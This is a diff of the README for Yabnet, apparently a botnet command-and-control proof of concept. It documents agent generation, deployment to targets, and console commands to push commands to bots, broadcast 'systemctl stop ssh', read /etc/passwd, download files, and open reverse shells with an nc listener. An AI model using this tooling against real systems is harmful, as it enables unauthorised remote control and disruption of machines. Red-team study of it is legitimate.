@@ -18,7 +18,9 @@ Yabnet is a proof of concept tool which was only created for educational purpose
 - [x] Create agent in `golang`, instead of using python 
 - [x] Support windows for agent 
 - [x] Clean up debugging codes in all files 
+- [x] Enhance golang agent & generation of golang 
 - [x] Enhance README documentation and usage
+- [ ] Add upload feature from master to server 
 - [ ] Finalize and structure all in-code comments  
 - [ ] Support communicating with PWNBOARD 
 
@@ -26,14 +28,14 @@ Yabnet is a proof of concept tool which was only created for educational purpose
 
 ## Installation 
 
-**Yabnet requires python3.7++, GOLANG, curl and docker**
+**Yabnet requires python3, GOLANG, curl and docker**
 
 **Due to laziness, yabnet currently requires to be installed in the /opt directory.**
 
-### Server setup - Docker
+### Server configuration & setup
+**Edit `Prodconfig` in `/yabnet/server/config.py` first.**
 ```
 cd /opt/yabnet/server
-<Edit the "ProdConfig" class in `config.py` file to your liking>
 
 docker build -t yabnet .
 docker run -p <ip>:<port>:<port> yabnet
@@ -44,8 +46,8 @@ docker run -p <ip>:<port>:<port> yabnet
 
 **Generating Agent through master console**
 ```
-Yabnet>> generate -i <serverip> -p <serverport> -f 
-Yabnet>> generate -i 192.168.204.153 -p 5000 -f -w   // -w is for Windows
+Yabnet>> generate -i <serverip> -p <serverport>
+Yabnet>> generate -i 192.168.204.153 -p 5000 -w   // -w is for Windows
 ```
 
 **Transfer the agent file** 
@@ -54,15 +56,13 @@ Transfer `/opt/yabnet/agent/agent` or `/opt/yabnet/agent/agent.exe` to the targe
 
 ### Master setup
 
-Use the credential that was passed through the `docker run` command for the server. 
+Use the credential that was configured in `/yabnet/server/config.py` file.
 
 ```
 python3 /opt/yabnet/master/master.py
 Yabnet>> login -r localhost -u <user> -p <password>
 Yabnet>> list
 
-# Default credentials is admin:password
-# By the way, all master console commands have help flag.
 Yabnet>> push -h 
 ``` 
 
@@ -90,12 +90,13 @@ The master console has various commands that can be used for controlling the bot
 
 | Command | Description | Examples | 
 | --- | --- | --- |
-| login | Login to the server as a master | `login -r 10.0.0.1:443 -u admin -p password` |
+| login | Login to the server as a master | `login -r 10.0.0.1:443 -u admin -p password` | 
+| generate | Compile and generate golang agent binary. Supports x64 of linux, windows | `generate -i 10.0.0.1 -p 443` | 
 | list | List all currently registered bots | `list` |
 | push | Push a command to bot(s) | `push -t <botid>,<botid> -c "cat /etc/passwd | grep backdoor"` | 
 | download | Command a bot to download a file from the server | `download -t <botid> -f test.txt -d c:\users\administrator\a.txt` | 
 | reverse | Command a bot to start a reverse shell back to server | `reverse -t <botid> -p <server_listening_port>` | 
-| broadcast | Push a command to entire bots | `broadcast -c "systemctl stop ssh"` | 
+| broadcast | Push a command to entire bots (Not Recommended) | `broadcast -c "systemctl stop ssh"` | 
 | cleanup | Remove all staged commands for all bots | `cleanup` | 
 | help, ? | List all possible commands | `help` | 
 
@@ -111,7 +112,7 @@ The master console has various commands that can be used for controlling the bot
 
 `ex) nc -lvnp 31337         // And then for the reverse shell from 10.0.3.4` 
 
-3. The server is hosting files in `/opt/yabnet/server/uploads/` directory.
+3. The server is hosting files in `/yabnet/server/uploads/` directory.
 
 4. All commands have `-h` help flag available.
 
